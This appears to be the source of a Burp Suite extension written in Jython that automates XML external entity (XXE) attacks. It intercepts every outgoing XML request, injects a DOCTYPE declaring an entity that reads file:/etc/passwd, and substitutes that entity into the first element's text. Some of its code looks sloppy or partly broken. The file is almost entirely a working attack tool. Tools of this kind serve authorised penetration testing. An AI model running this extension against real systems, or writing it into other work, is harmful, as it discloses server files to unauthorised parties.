###############################################################################################################
# THIS IS BURP EXTENDER CODE TO AUTOMATE THE XXE ATTACKS                                                                                                          #
#                                                                                                             #
#                                                                                                             #
#                                                                                                             #
#                                                                                                             #
#                                                                                                             #
#                                                                                                             #
###############################################################################################################

from burp import IBurpExtender
from burp import IHttpListener
from java.io import PrintWriter
from java.lang import RuntimeException
import xml.etree.ElementTree as ET
from org.python.util import JLineConsole, PythonInterpreter
from org.python.core import imp
from java.lang import Thread

Thread.currentThread().setContextClassLoader(imp.getParentClassLoader())

import javax.xml.parsers.SAXParserFactory as SAXParserFactory
import org.xml.sax.helpers.DefaultHandler as DefaultHandler
import java.io.ByteArrayInputStream as ByteArrayInputStream


class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._stdout = PrintWriter(callbacks.getStdout(), True)
        self._stderr = PrintWriter(callbacks.getStderr(), True)
        callbacks.setExtensionName("XxeAttack")

        callbacks.registerHttpListener(self)
        self._stdout.println("Hello output")


    def processHttpMessage(self, toolFlag, messageIsRequest, currentRequest):
        if not messageIsRequest:
            return None
        requestInfo = self._helpers.analyzeRequest(currentRequest.getRequest())
        #self._stdout.println(self._helpers.bytesToString(currentRequest.getRequest()))
        req = self._helpers.bytesToString(currentRequest.getRequest())
        #self._stdout.println("Request123:" + req)
        reqs=self.XXEPayload(req)
        self._stdout.println("Reqs" +reqs)
        reqs=self._helpers.stringToBytes(reqs)
        currentRequest.setRequest(self._helpers.buildHttpMessage(requestInfo.getHeaders(),reqs))
        self._stdout.println("Modified" +self._helpers.bytesToString(currentRequest.getRequest))

      


    
    def XXEPayload(self,req):

        RequestString1=str(req)
        self._stdout.println("########################################")
        self._stdout.println("Request123:"+RequestString1)
        RequestString2 = RequestString1[RequestString1.find("<?xml"):len(RequestString1)]
        RequestString3 = RequestString1[RequestString1.find("<?xml"):len(RequestString1)]
        self._stdout.println("########################################")
        self._stdout.println("Processed XML Request:" + RequestString2)
        tree = ET.fromstring(RequestString2)
        a = '<?xml version="1.0"?>'
        b = """<?xml version="1.0"?>
        <!DOCTYPE test [<!ENTITY name SYSTEM "file:/etc/passwd">]>"""
        RequestString2 = RequestString1.replace(a, b)
        RequestString3 = RequestString3.replace(a, b)
        self._stdout.println("########################################")
        self._stdout.println("Replaced XML DOC Request:" + RequestString2)
        replacements1 = {a: b}
        child = tree[0]
        child1 = child.tag
        c = child.text
        RequestString2 = RequestString2.replace(child.text, "&name;")
        RequestString3 = RequestString3.replace(child.text, "&name;")

        RequestString2 = RequestString2[RequestString2.find("<?xml"):len(RequestString2)]
        self._stdout.println("Replaced XML elem Request:" +RequestString3)
        return RequestString3
